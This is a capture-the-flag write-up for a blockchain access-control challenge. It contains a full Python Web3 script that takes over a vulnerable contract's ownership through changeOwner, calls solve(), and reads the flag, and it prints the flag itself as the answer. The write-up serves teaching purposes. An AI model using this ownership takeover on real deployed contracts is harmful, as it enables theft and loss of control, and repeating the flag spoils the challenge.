# Access_Control

---

### Challenge Details

> **Platform:** CyLab Academy  
> **Category:** `Blockchain`  
> **Difficulty:** Medium 
> **Points:** 400

---

### Overview

This challenge hosts a vulnerable Ethereum node that contains an access control vulnerability that, when triggered, reveals the flag. 

---

### Solution

Starting off this challenge the player is provided with an Ethereum smart contract, node HTTP address, contract address, a private wallet key, and a private wallet address. 
The wallet address is omitted from the challenge solution since it's derived from the private key in a predictable way, so it can be dynamically determined. 

<img width="1718" height="879" alt="Screenshot 2026-08-16 215134" src="https://github.com/user-attachments/assets/f6f44114-676f-44a7-81fa-c5e98e94ea77" />

When it comes to blockchain CTFs there is usually a vulnerability in the contract code that reveals the process of retrieving the flag. This trend is the same for this challenge.

<img width="1719" height="876" alt="Screenshot 2026-08-16 215155" src="https://github.com/user-attachments/assets/ea2947de-004a-47d4-996e-aa3b70937ec1" />

In this challenge the vulnerability arises from allowing any public user to change the owner of the flag to themselves and simply read out the contents from memory once the owner change is processed.

After identifying the vulnerability the last step is to create a Python exploit script that reaches out to the node, changes the owner to the custom address of the user, and trigger the solve function to read the flag contents.

To assemble this script the player needs the ABI (Application Binary Interface) of the contract so that specific functions can be called in the desired order. To find the ABI the player compiles the provided contract in Ethereum's web-based [Remix IDE](https://remix.ethereum.org/) platform to retrieve the ABI.

<img width="1714" height="874" alt="Screenshot 2026-08-16 215352" src="https://github.com/user-attachments/assets/48c09002-4d06-4dbe-9215-18320b565621" />

After retrieving the ABI the player can create the necessary script using the `Web3` library in Python to interact with the node over RPC and trigger the vulnerability condition to retrieve the flag.

Script Contents (Fill in Necessary Values):
```Python
from web3 import Web3

# Connect to the provided node
w3 = Web3(Web3.HTTPProvider("http://HTTP-ETHEREUM-NODE-ADDRESS-Here:PORT"))
print(w3.is_connected())

# Load your account from the given private key
acct = w3.eth.account.from_key("PROVIDED-PRIVATE-KEY")

contract_address = "PROVIDED-CONTRACT-ADDRESS"
abi = {
  "JSON": "INSERT JSON ABI CONTENTS HERE"
}  # ABI compiled from remix.ethereum.org

contract = w3.eth.contract(address=contract_address, abi=abi)

# Build the changeOwner transaction, making YOUR address the new owner
tx = contract.functions.changeOwner(acct.address).build_transaction({
    "from": acct.address,
    "nonce": w3.eth.get_transaction_count(acct.address),
    "gas": 300000,
    "gasPrice": w3.eth.gas_price,
})

# Sign it with your private key
signed_tx = acct.sign_transaction(tx)

# Send the raw signed transaction to the node
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)

# Wait for it to be mined and get the receipt
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print("changeOwner tx status:", receipt.status)  # 1 = success, 0 = failed

print("Current owner:", contract.functions.owner().call())

# Call solve() which updates the flag reveal condition
tx2 = contract.functions.solve().build_transaction({
    "from": acct.address,
    "nonce": w3.eth.get_transaction_count(acct.address),
    "gas": 300000,
    "gasPrice": w3.eth.gas_price,
})
signed_tx2 = acct.sign_transaction(tx2)
tx_hash2 = w3.eth.send_raw_transaction(signed_tx2.raw_transaction)
receipt2 = w3.eth.wait_for_transaction_receipt(tx_hash2)
print("solve tx status:", receipt2.status)  # 1 = success, 0 = failed

print("Revealed:", contract.functions.revealed().call())

# Reveal the flag contents
flag = contract.functions.getFlag().call()
print("Flag:", flag)

```

After running the script the flag is retrieved in the output.
<img width="1716" height="875" alt="Screenshot 2026-08-16 215808" src="https://github.com/user-attachments/assets/54cc16dd-3b36-4bf0-a067-00bbc2fc15d7" />

Overall this challenge was a bit difficult to understand if it's your first blockchain challenge, but it's relatively easy to grasp the core vulnerability and how it's triggered over RPC connections.

### Tools Used

- `Python`: High-level, interpreted, general-purpose programming and scripting language used for exploit development and automation
- `Ethereum Remix IDE`: Free, open-source, web-based IDE for writing, testing, and deploying Ethereum smart contracts 

### Flag

```text
picoCTF{i_c4n_b3_0wn3r_99d8beba}
```
